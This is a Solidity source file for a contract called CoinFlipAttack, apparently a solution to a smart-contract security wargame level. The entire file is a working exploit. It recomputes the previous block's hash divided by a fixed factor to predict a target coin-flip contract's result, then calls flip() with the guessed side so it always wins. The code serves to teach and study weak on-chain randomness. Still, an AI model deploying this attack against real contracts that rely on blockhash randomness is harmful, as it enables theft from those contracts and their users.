// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ICoinFlip} from "../interfaces/ICoinFlip.sol";

contract CoinFlipAttack {
    ICoinFlip public immutable target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool success = target.flip(side);
        require(success, "Flip failed");
    }
}
